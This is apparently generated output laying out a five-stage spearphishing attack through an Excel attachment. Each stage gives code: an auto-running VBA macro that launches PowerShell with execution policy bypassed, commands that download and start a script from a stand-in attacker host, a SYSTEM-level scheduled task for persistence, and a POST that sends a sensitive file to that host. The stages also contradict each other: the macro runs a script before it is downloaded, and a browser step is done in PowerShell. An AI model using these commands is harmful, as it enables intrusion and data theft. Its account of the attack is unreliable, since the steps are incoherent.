<output>
Pattern Name: Spearphishing Attachment

Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment designed to exploit a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes a foothold in the victim's environment.

Attack Flow Breakdown:

**Stage 1: Initial Access via Email**
- **Application Involved**: Microsoft Outlook
- **User Action**: The user receives an email with a subject line "Invoice Attached" and an Excel file named "Invoice_2023.xlsx".
- **Key Artifacts**: Email headers, attachment file.
- **Command**: 
  ```powershell
  # User opens the email and downloads the attachment
  Invoke-WebRequest -Uri "http://malicious-website.com/Invoice_2023.xlsx" -OutFile "C:\Users\User\Downloads\Invoice_2023.xlsx"
  ```

**Stage 2: Opening the Malicious Attachment**
- **Application Involved**: Microsoft Excel
- **User Action**: The user opens the downloaded Excel file, which contains a macro designed to execute a PowerShell command.
- **Key Artifacts**: Excel file with macros enabled.
- **Command**: 
  ```vba
  ' Excel macro that executes PowerShell command
  Sub Auto_Open()
      Dim shell As Object
      Set shell = CreateObject("WScript.Shell")
      shell.Run "powershell.exe -ExecutionPolicy Bypass -File C:\Users\User\Downloads\malicious_script.ps1"
  End Sub
  ```

**Stage 3: Execution of the Payload**
- **Application Involved**: PowerShell
- **User Action**: The macro executes a PowerShell script that downloads and executes a remote payload.
- **Key Artifacts**: PowerShell command execution logs, downloaded script.
- **Command**: 
  ```powershell
  # PowerShell command executed by the macro
  Invoke-WebRequest -Uri "http://malicious-website.com/malicious_script.ps1" -OutFile "C:\Users\User\Downloads\malicious_script.ps1"
  Start-Process "C:\Users\User\Downloads\malicious_script.ps1"
  ```

**Stage 4: Establishing Persistence**
- **Application Involved**: Windows Task Scheduler
- **User Action**: The downloaded script creates a scheduled task to ensure persistence.
- **Key Artifacts**: Scheduled task entries.
- **Command**: 
  ```powershell
  # Create a scheduled task to run the malicious script at startup
  $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File C:\Users\User\Downloads\malicious_script.ps1"
  $trigger = New-ScheduledTaskTrigger -AtStartup
  Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "MaliciousTask" -User "SYSTEM" -RunLevel Highest
  ```

**Stage 5: Data Exfiltration**
- **Application Involved**: Web Browser (e.g., Chrome)
- **User Action**: The malware collects sensitive data and sends it to an external server.
- **Key Artifacts**: Network traffic logs, exfiltrated data.
- **Command**: 
  ```powershell
  # Exfiltrate data to the attacker's server
  $data = Get-Content "C:\Users\User\Documents\SensitiveData.txt"
  Invoke-RestMethod -Uri "http://malicious-website.com/exfiltrate" -Method Post -Body $data
  ```

</output>